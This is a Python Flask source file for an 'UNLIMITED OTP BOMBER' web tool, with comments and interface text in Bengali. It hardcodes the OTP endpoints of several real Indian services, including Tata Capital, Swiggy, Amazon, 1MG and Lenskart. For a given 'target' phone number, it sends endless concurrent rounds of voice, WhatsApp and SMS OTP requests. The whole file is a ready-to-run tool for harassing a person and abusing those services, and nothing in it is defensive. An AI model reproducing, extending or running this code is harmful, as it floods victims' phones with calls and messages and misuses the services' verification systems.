import os
import requests
import concurrent.futures
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)

# 🔥 তোমার API গুলো এখানে যোগ করো (উদাহরণস্বরূপ কয়েকটা দেওয়া আছে)
APIS = [
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp"},
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    # আরও API যোগ করতে চাইলে এখানে বসাও (একই ফরম্যাটে)
]

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💀 UNLIMITED OTP BOMBER 💀</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c);
            font-family: 'Courier New', 'Fira Code', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .glass-card {
            background: rgba(10, 15, 30, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 64px;
            border: 1px solid rgba(255, 80, 80, 0.5);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            width: 100%;
            max-width: 700px;
            padding: 40px 30px;
        }
        .tool-name {
            text-align: center;
            font-size: 2rem;
            font-weight: 900;
            background: linear-gradient(45deg, #FF4D4D, #FFB84D);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 3px;
            margin-bottom: 15px;
        }
        h1 {
            text-align: center;
            font-size: 2.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #FFFFFF, #FF6666);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
        }
        .sub {
            text-align: center;
            color: #ff9999;
            margin-bottom: 30px;
            font-size: 0.9rem;
        }
        .input-group { margin-bottom: 25px; }
        label { color: #ffb347; display: block; margin-bottom: 10px; font-weight: bold; }
        .phone-field {
            display: flex;
            background: #0b0e18;
            border-radius: 60px;
            border: 1px solid #ff4d4d;
        }
        .country-code { background: #1f1a2e; padding: 14px 20px; border-radius: 60px 0 0 60px; color: #ffaa66; font-weight: bold; border-right: 1px solid #ff4d4d; }
        input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 14px 18px;
            color: #fff;
            font-size: 1.1rem;
            outline: none;
            font-family: monospace;
        }
        button {
            width: 100%;
            background: linear-gradient(95deg, #cc0000, #660000);
            border: none;
            padding: 16px;
            border-radius: 60px;
            font-weight: bold;
            font-size: 1.2rem;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }
        button:hover { transform: scale(0.97); background: #ff0000; box-shadow: 0 0 20px red; }
        #stopBtn { background: #333; margin-top: 10px; }
        #stopBtn:hover { background: #555; box-shadow: none; }
        .output-box {
            background: #000000aa;
            border-radius: 32px;
            padding: 20px;
            margin-top: 30px;
            border: 1px solid #ff4d4d;
            max-height: 450px;
            overflow-y: auto;
        }
        pre {
            font-family: 'Courier New', monospace;
            font-size: 0.7rem;
            color: #0f0;
            white-space: pre-wrap;
        }
        .badge, .developer {
            text-align: center;
            margin-top: 20px;
            font-size: 0.75rem;
            color: #aa8866;
            border-top: 1px solid #442222;
            padding-top: 15px;
        }
        .developer { font-weight: bold; color: #ffaa66; }
    </style>
</head>
<body>
<div class="glass-card">
    <div class="tool-name">🔥 CYBER TOOLS 🔥</div>
    <h1>💀 UNLIMITED OTP BOMBER 💀</h1>
    <div class="sub">⚡ 100+ APIS (আপনি যোগ করুন) | VOICE + WHATSAPP + SMS ⚡<br>🚀 INFINITE ROUNDS | CONCURRENT THREADS 🚀</div>

    <div class="input-group">
        <label>📞 টার্গেট নম্বর (10 ডিজিট)</label>
        <div class="phone-field">
            <span class="country-code">+91</span>
            <input type="tel" id="phone" placeholder="9876543210" maxlength="10">
        </div>
    </div>

    <button id="startBtn">💣 START UNLIMITED BOMBING 💣</button>
    <button id="stopBtn">🛑 STOP / RESET 🛑</button>

    <div class="output-box">
        <pre id="output">⚡ রেডি। নম্বর দিন ও START চাপুন। সারাদিন চলবে।</pre>
    </div>
    <div class="badge">🔥 আনলিমিটেড রাউন্ড | প্রতি রাউন্ডে 0.1 সেকেন্ড দেরি 🔥</div>
    <div class="developer">👨‍💻 DEVELOPER: ARIF 👨‍💻</div>
</div>

<script>
    let running = false;
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const phoneInput = document.getElementById('phone');
    const outputPre = document.getElementById('output');

    async function sendRound(phone) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 20000);
            const response = await fetch('/bomb', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            const data = await response.json();
            return data.log || "⚠️ No log returned";
        } catch (err) {
            return `⚠️ Round failed: ${err.message}`;
        }
    }

    startBtn.onclick = async () => {
        if (running) {
            outputPre.innerText += '\\n⚠️ ইতিমধ্যে চলছে! আগে STOP চাপুন।\\n';
            return;
        }
        let phone = phoneInput.value.trim();
        if (!phone || phone.length !== 10 || isNaN(phone)) {
            outputPre.innerText = '❌ ভুল নম্বর! 10 ডিজিট দিন।\\n';
            return;
        }
        running = true;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        outputPre.innerText = '🔥 বোমিং শুরু হয়েছে (আনলিমিটেড) - STOP চাপুন বন্ধ করতে 🔥\\n\\n';
        let round = 0;
        while (running) {
            round++;
            outputPre.innerText += `\\n========== রাউন্ড ${round} ==========\\n`;
            let result = await sendRound(phone);
            outputPre.innerText += result + '\\n';
            await new Promise(r => setTimeout(r, 100));
        }
        startBtn.disabled = false;
        stopBtn.disabled = true;
        outputPre.innerText += '\\n🛑 বোমিং বন্ধ করা হয়েছে।\\n';
        running = false;
    };

    stopBtn.onclick = () => {
        if (running) {
            running = false;
            outputPre.innerText += '\\n🛑 থামানোর নির্দেশ দেওয়া হয়েছে...\\n';
        }
    };
    stopBtn.disabled = true;
</script>
</body>
</html>
"""

def send_request(api, phone):
    try:
        if callable(api['url']):
            url = api['url'](phone)
        else:
            url = api['url']
        headers = api['headers'].copy() if api['headers'] else {}
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
        data = None
        if api.get('data') and api['data']:
            data = api['data'](phone) if callable(api['data']) else api['data']
        if api['method'] == 'POST':
            r = requests.post(url, headers=headers, data=data, timeout=5)
        else:
            r = requests.get(url, headers=headers, timeout=5)
        return f"[+] {api['name']} → {r.status_code}"
    except Exception as e:
        return f"[-] {api['name']} → {str(e)[:40]}"

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/bomb', methods=['POST'])
def bomb():
    phone = request.json.get('phone')
    if not phone or len(phone) != 10:
        return jsonify({"log": "Invalid phone number"}), 400
    if not APIS:
        return jsonify({"log": "⚠️ No APIs added."}), 200
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(send_request, api, phone) for api in APIS]
        logs = [f.result() for f in concurrent.futures.as_completed(futures)]
    return jsonify({"log": "\n".join(logs)})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
